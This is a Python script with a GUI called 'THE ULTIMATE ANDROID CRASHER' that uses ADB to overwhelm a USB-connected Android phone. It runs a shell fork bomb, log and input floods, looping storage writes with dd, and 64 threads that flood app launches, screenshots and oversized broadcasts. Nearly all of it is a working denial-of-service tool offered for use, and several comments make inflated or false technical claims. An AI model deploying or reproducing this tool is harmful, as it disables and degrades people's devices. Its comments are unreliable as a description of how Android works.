import threading
import random
import time
import subprocess
import os
import tkinter as tk
from tkinter import ttk
from adb.client import Client as AdbClient

# 1. Connect to local ADB server
client = AdbClient(host="127.0.0.1", port=5037)
devices = client.devices()

if not devices:
    print("No USB devices found.")
    exit()

device = devices[0]

# Fetch user and system applications (including deep hidden system services)
packages_raw = device.shell("pm list packages")
apps = [line.split(":")[-1].strip() for line in packages_raw.splitlines() if line.strip()]

# Massive text buffer optimized to max out modern high-capacity RAM buffers (LPDDR6 / LPDDR5X)
heavy_text = "LAG_OVERFLOW_MEMORY_DUMP_CORE_THRASH_DESTRUCTION_" * 150000 

# --- NATIVE PHONE-SIDE RECURSION FORK BOMBS & ARCHITECTURAL CHOKES ---
# These bypass the USB cable completely and execute recursive replication loops directly inside the phone's CPU registers.
SHELL_STRESS_COMMANDS = [
    # Loop 1: Native Shell Fork-Bomb Simulation (Constantly spawns logging sub-processes exponentially)
    "forkbomb() { log -p f -t CRASHER 'KILL'; forkbomb | forkbomb & }; forkbomb &",
    
    # Loop 2: Double-Channel Kernel Log spamming targeting core kernel thread pipelines
    "while true; do log -p f -t CRASHER 'FATAL_CORE_COLLAPSE'; log -p e -t CRASHER 'SYSTEM_PANIC'; done &",
    
    # Loop 3: SurfaceFlinger Engine Deadlock - Continuously calls core window token compositions to completely break display rendering
    "while true; do service call window 1; service call window 2; service call window 3; service call window 4; done &",
    
    # Loop 4: Max-Hz Vector Engine Choke - Simulates extreme, continuous notification/statusbar swipe velocity calculations
    "while true; do cmd statusbar expansion-drag 100; cmd statusbar expansion-drag 0; cmd statusbar expansion-drag -100; done &",
    
    # Loop 5: High-Frequency Multi-Touch Input flooding directly into the WindowManagerService pipeline
    "while true; do input keyevent 26; input keyevent 25; input tap 100 100; input tap 900 900; input swipe 0 0 1000 1000 1; done &",
    
    # Loops 6-9: Octa-channel raw storage saturation block over /dev/urandom to overwhelm high-speed UFS 4.0 storage controller buses
    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap1.bin bs=25M count=4; rm /sdcard/Pictures/Screenshots/swap1.bin; done &",
    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap2.bin bs=25M count=4; rm /sdcard/Pictures/Screenshots/swap2.bin; done &",
    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap3.bin bs=25M count=4; rm /sdcard/Pictures/Screenshots/swap3.bin; done &",
    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap4.bin bs=25M count=4; rm /sdcard/Pictures/Screenshots/swap4.bin; done &"
]

# --- PC-TO-PHONE MULTI-THREADED FLOOD WORKERS (SCALED UP TO 64 CORES / HYPERTHREADED) ---

def app_flood():
    """Forces instant, hyper-aggressive Zygote process allocation failures."""
    while True:
        try:
            a1, a2, a3, a4, a5 = random.choice(apps), random.choice(apps), random.choice(apps), random.choice(apps), random.choice(apps)
            # Floods the phone with 5 concurrent app starts simultaneously via background forking
            device.shell(f"monkey -p {a1} 1 & monkey -p {a2} 1 & monkey -p {a3} 1 & monkey -p {a4} 1 & monkey -p {a5} 1")
            device.shell(f"am force-stop {random.choice(apps)} & am force-stop {random.choice(apps)} & am force-stop {random.choice(apps)}")
        except Exception: pass

def screenshot_flood():
    """Jams the hardware graphics composer pipeline completely, freezing the UI display output."""
    while True:
        try:
            r1, r2, r3, r4, r5 = random.randint(1,999999), random.randint(1,999999), random.randint(1,999999), random.randint(1,999999), random.randint(1,999999)
            # Parallel execution of 5 concurrent uncompressed screen rendering pipelines
            device.shell(f"screencap -p /sdcard/Pictures/Screenshots/st_{r1}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r2}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r3}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r4}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r5}.png")
        except Exception: pass

def clipboard_flood():
    """Exhausts the core Android Binder transaction buffer limit via massive cross-process memory dumps."""
    while True:
        try:
            device.shell(f"am broadcast -a android.intent.action.SEND --es android.intent.extra.TEXT '{heavy_text}' & am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE & am broadcast -a android.intent.action.BOOT_COMPLETED")
        except Exception: pass

# --- GUI ROUTINES ---

root = tk.Tk()
root.title("THE ULTIMATE ANDROID CRASHER")
root.geometry("450x200")
root.configure(bg="black")
root.resizable(False, False)

style = ttk.Style()
style.theme_use('default')
style.configure("Green.Horizontal.TProgressbar", background="#00FF00", troughcolor="black", bordercolor="black")

label = tk.Label(root, text="crashing your android....", font=("Courier", 16, "bold"), fg="#00FF00", bg="black")
label.pack(pady=30)

progress = ttk.Progressbar(root, style="Green.Horizontal.TProgressbar", orient="horizontal", length=350, mode="determinate")
progress.pack(pady=10)

status_label = tk.Label(root, text="Preparing USB data links...", font=("Courier", 10), fg="#00FF00", bg="black")
status_label.pack(pady=5)

def start_stress_test():
    status_label.config(text="Deploying 64 Hyper-Performance Workers & scrcpy...")
    root.update()
    
    # Phase 1: Inject internal infinite background recursive loops into the phone's shell sub-layer
    for cmd in SHELL_STRESS_COMMANDS:
        try:
            device.shell(cmd)
        except Exception: pass
        
    # Phase 2: Launch 64 PC-side asynchronous thread workers to crush heavy multi-core architectures
    threads = []
    for _ in range(24): threads.append(threading.Thread(target=app_flood, daemon=True))
    for _ in range(24): threads.append(threading.Thread(target=screenshot_flood, daemon=True))
    for _ in range(16): threads.append(threading.Thread(target=clipboard_flood, daemon=True))
    
    for t in threads:
        t.start()
        
    # Phase 3: Spin up scrcpy viewport to track the system's absolute frame rendering breakdown
    try:
        subprocess.Popen(["scrcpy", "--always-on-top", "--window-title=CRASHER_VIEW", "--max-fps=30"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        status_label.config(text="Error: 'scrcpy' binary not found in system PATH.")
        return

    status_label.config(text="ABSOLUTE SYSTEM COLLAPSE IN PROGRESS.")

def simulate_usb_push():
    dummy_file = "payload.bin"
    remote_path = "/data/local/tmp/payload.bin"
    file_size_mb = 100 # Ultra-heavy payload transfer simulation to saturate caching mechanisms upfront
    
    with open(dummy_file, "wb") as f:
        f.write(os.urandom(file_size_mb * 1024 * 1024))
        
    total_bytes = os.path.getsize(dummy_file)

    def progress_callback(filename, uploaded_bytes, total):
        percentage = (uploaded_bytes / total_bytes) * 100
        progress['value'] = percentage
        status_label.config(text=f"Sending Payload: {uploaded_bytes // 1024}KB / {total_bytes // 1024}KB")
        root.update_idletasks()

    try:
        device.push(dummy_file, remote_path, progress_callback=progress_callback)
    finally:
        if os.path.exists(dummy_file): os.remove(dummy_file)
        try: device.shell(f"rm {remote_path}")
        except Exception: pass

    progress['value'] = 100
    start_stress_test()

root.after(1000, lambda: threading.Thread(target=simulate_usb_push, daemon=True).start())
root.mainloop()
